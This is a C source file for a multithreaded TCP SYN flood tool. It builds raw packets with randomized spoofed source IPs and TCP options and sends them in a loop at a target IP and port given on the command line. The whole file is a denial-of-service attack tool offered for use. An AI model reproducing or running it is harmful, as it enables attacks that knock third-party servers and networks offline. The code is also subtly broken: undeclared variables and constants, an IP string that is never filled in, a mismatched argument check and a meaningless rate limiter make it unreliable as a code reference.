/*
 * This is released under the GNU GPL License v3.0, and is allowed to be used for commercial products ;)
 */
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
struct in_addr ourIP;
static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
int spoofit;
void init_rand(unsigned long int x)
{
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}
unsigned long int rand_cmwc(void)
{
	unsigned long long int t, a = 18782LL;
	static unsigned long int i = 4095;
	unsigned long int x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);
	x = t + c;
	if (x < c) {
		x++;
		c++;
	}
	return (Q[i] = r - x);
}
static uint8_t ipState[5];
in_addr_t getRandomPublicIP()
{
	if(ipState[1] < 255 && ipState[2] < 255 && ipState[3] < 255 && ipState[4] < 255)
        {
                ipState[1]++;
		ipState[2]++;
		ipState[3]++;
		ipState[4]++;
                char ip[16];
                //printf(ip, "%d.%d.%d.%d", ipState[1], ipState[2], ipState[3], ipState[4]);
		return inet_addr(ip);
        }

	ipState[1] = 0;
	ipState[2] = 0;
        ipState[3] = 0;
	ipState[4] = 0;
        while(
                (ipState[1] == 0) ||
                (ipState[1] == 10) ||
                (ipState[1] == 100 && (ipState[2] >= 64 && ipState[2] <= 127)) ||
                (ipState[1] == 127) ||
                (ipState[1] == 169 && ipState[2] == 254) ||
                (ipState[1] == 172 && (ipState[2] <= 16 && ipState[2] <= 31)) ||
                (ipState[1] == 192 && ipState[2] == 0 && ipState[3] == 2) ||
                (ipState[1] == 192 && ipState[2] == 88 && ipState[3] == 99) ||
                (ipState[1] == 192 && ipState[2] == 168) ||
                (ipState[1] == 198 && (ipState[2] == 18 || ipState[2] == 19)) ||
                (ipState[1] == 198 && ipState[2] == 51 && ipState[3] == 100) ||
                (ipState[1] == 203 && ipState[2] == 0 && ipState[3] == 113) ||
                (ipState[1] >= 224)
        )
        {
                ipState[1] = rand() % 150;
        	ipState[2] = rand() % 150;
        	ipState[3] = rand() % 150;
		ipState[4] = rand() % 150;
        }

	char ip[16];
        //printf(ip, "%d.%d.%d.%d", ipState[1], ipState[2], ipState[3], ipState[4]);
	return inet_addr(ip);
}
in_addr_t getRandomIP(in_addr_t netmask)
{
        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
        return tmp ^ ( rand_cmwc() & ~netmask);
}
unsigned short csum (unsigned short *buf, int count)
{
	register unsigned long sum = 0;
	while( count > 1 ) { sum += *buf++; count -= 2; }
	if(count > 0) { sum += *(unsigned char *)buf; }
	while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
	return (unsigned short)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {

	struct tcp_pseudo
	{
		unsigned long src_addr;
		unsigned long dst_addr;
		unsigned char zero;
		unsigned char proto;
		unsigned short length;
	} pseudohead;
	unsigned short total_len = iph->tot_len;
	pseudohead.src_addr=iph->saddr;
	pseudohead.dst_addr=iph->daddr;
	pseudohead.zero=0;
	pseudohead.proto=IPPROTO_TCP;
	pseudohead.length=htons(sizeof(struct tcphdr));
	int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
	unsigned short *tcp = malloc(totaltcp_len);
	memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
	memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
	unsigned short output = csum(tcp,totaltcp_len);
	free(tcp);
	return output;
}

struct pseudo_header    //needed for checksum calculation
{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	
	struct tcphdr tcp;
};

void setup_ip_header(struct iphdr *iph)
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
	iph->id = htonl(54321);
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = 6;
	iph->check = 0;
	iph->saddr;
}

void setup_tcp_header(struct tcphdr *tcph)
{
	tcph->source = htons(5678);
	tcph->seq = rand();
	tcph->ack_seq = 0;
	tcph->res2 = 0;
	tcph->doff = 5;
	tcph->syn = 1;
	tcph->window = htons(65535);
	tcph->check = 0;
	tcph->urg_ptr = 0;
}

void *flood(void *par1)
{
	char *td = (char *)par1;
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *)datagram;
	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
	struct pseudo_header psh;
	opts = (uint8_t *)(tcph + 1);
	
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(floodport);
	sin.sin_addr.s_addr = inet_addr(td);

	int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if(s < 0){
		fprintf(stderr, "Could not open raw socket.\n");
		exit(-1);
	}
	memset(datagram, 0, MAX_PACKET_SIZE);
	setup_ip_header(iph);
	setup_tcp_header(tcph);

	tcph->dest = htons(floodport);

	iph->daddr = sin.sin_addr.s_addr;
	iph->check = csum ((unsigned short *) datagram, iph->tot_len);

	int tmp = 1;
	const int *val = &tmp;
	if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
		fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
		exit(-1);
	}
	
        psh.source_address = getRandomPublicIP();
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(20);
	
	// TCP MSS
        *opts++ = PROTO_TCP_OPT_MSS;    // Kind
        *opts++ = 4;                    // Length
        *((uint16_t *)opts) = htons(1400 + (rand() & 0x0f));
        opts += sizeof (uint16_t);

        // TCP SACK permitted
        *opts++ = PROTO_TCP_OPT_SACK;
        *opts++ = 2;

        // TCP timestamps
        *opts++ = PROTO_TCP_OPT_TSVAL;
        *opts++ = 10;
        *((uint32_t *)opts) = rand();
        opts += sizeof (uint32_t);
        *((uint32_t *)opts) = 0;
        opts += sizeof (uint32_t);

        // TCP nop
        *opts++ = 1;

        // TCP window scale
        *opts++ = PROTO_TCP_OPT_WSS;
        *opts++ = 3;
        *opts++ = 6; // 2^6 = 64, window size scale = 64
	
	register unsigned int i;
	i = 0;
	while(1)
	{
            for(i=0;i < 950000000;i++)
	    {
		in_addr_t netmask;

                if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
                else netmask = ( ~((1 << (32 - spoofit)) - 1) );
		
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));

		iph->saddr = htonl( getRandomPublicIP() );
		iph->id = htonl(rand());
		iph->check = 0;
		tcph->seq = htons(1337);
		tcph->source = htons(rand());
		tcph->check = 0;
	    }
		break;
                if (errno != 0)
                    printf("errno = %d\n", errno);
	}
}
int main(int argc, char *argv[ ])
{
	if(argc < 7){
		fprintf(stderr, "Invalid parameters!\n");
		fprintf(stdout, "Usage: %s <target IP> <port to be flooded> <number threads to use> <pps limiter, -1 for no limit> <time>\n", argv[0]);
		exit(-1);
	}

	fprintf(stdout, "Setting up Sockets...\n");

	int num_threads = atoi(argv[3]);
	floodport = atoi(argv[2]);
	spoofit = atoi(argv[4]);
	int maxpps = atoi(argv[5]);
	limiter = 0;
	pps = 0;
	pthread_t thread[num_threads];
	
	int multiplier = 20;

	int i;
	for(i = 0;i<num_threads;i++){
		pthread_create( &thread[i], NULL, &flood, (void *)argv[1]) * 4096;
	}
	fprintf(stdout, "Starting Flood...\n");
	for(i = 0;i<(atoi(argv[6])*multiplier);i++)
	{
		usleep((1000/multiplier)*1000);
		if((580000000*multiplier) > maxpps)
		{
			if(1 > limiter)
			{
				sleeptime+=100;
			} else {
				limiter--;
			}
		} else {
			limiter++;
			if(sleeptime > 25)
			{
				sleeptime-=25;
			} else {
				sleeptime = 0;
			}
		}
		pps = 580000000;
	}

	return 0;
}
